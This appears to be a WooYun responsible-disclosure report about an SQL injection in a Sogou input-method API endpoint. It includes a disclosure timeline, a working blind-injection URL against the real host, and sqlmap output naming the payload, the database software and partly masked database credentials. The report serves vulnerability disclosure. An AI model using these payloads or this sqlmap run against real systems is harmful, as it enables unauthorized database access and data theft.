wybug_title: 搜狗输入法官方一处高危SQL注入漏洞
wybug_detail: 漏洞详情 披露状态：   									2015-12-20：	细节已通知厂商并且等待厂商处理中									2015-12-21：	厂商已经确认，细节仅向厂商公开									2015-12-31：	细节向核心白帽子及相关领域专家公开									2016-01-10：	细节向普通白帽子公开									2016-01-20：	细节向实习白帽子公开									2016-02-01：	细节向公众公开  简要描述： RTRT 详细说明：  http://config.pinyin.sogou.com/api/app75/get_score_list.php?appid=6)%20and%200x6d%20=substr(database(),1,1)%20--%20d 如何呢？用户名IME@10..数据库:ime_clie**   漏洞证明：  [root@Hacker~]# Sqlmap -u "http://config.pinyin.sogou.com/api/app75/get_score_list.php?appid=6"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:21:16[20:21:17] [INFO] resuming back-end DBMS 'mysql'[20:21:17] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: appid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: appid=66) AND 5644=5644 AND (6642=6642---[20:21:19] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.1.6back-end DBMS: MySQL 5[20:21:19] [INFO] fetched data logged to text files under 'C:\Users\dell-pc\AppData\Local\Temp\HZ$D66~1.688\HZ$D66~1.689\SQLMAP~1\Bin\output\config.pinyin.sogou.com'[*] shutting down at 20:21:19[root@Hacker~]# Sqlmap用户名IME@10..:ime_client   修复方案：  过滤   版权声明：转载请注明来源 雷@乌云
